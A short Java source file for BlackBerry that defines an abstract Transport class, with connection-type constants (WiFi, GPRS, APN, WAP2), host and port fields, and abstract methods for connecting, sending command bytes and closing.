//#preprocess
package blackberry.action.sync;

import blackberry.action.Apn;
import blackberry.action.sync.transport.TransportException;
import blackberry.action.sync.transport.Wap2Transport;
import blackberry.crypto.Encryption;
import blackberry.utils.Check;

public abstract class Transport {
    public final static int WIFI = 0;
    public final static int GPRS = 1;
    public final static int APN = 2;
    public final static int WAP2 = 3;
    public final static int NUM = 4;

    protected String host;
    protected int port;

    protected String url;
        
    public Transport(String host, int port) {
        this.host = host;
        this.port = port;
    }

    public String toString() {
        return "Transport " + host + ":" + port;
    }

    public abstract boolean isAvailable();

    public abstract byte[] command(byte[] data) throws TransportException;
    
    public abstract boolean initConnection();

    public abstract void close();

    public String getUrl() {
        //#ifdef DBC
        Check.requires(url != null && url.length() > 0, "getUrl: empty url");
        //#endif
        return url;
    }

}
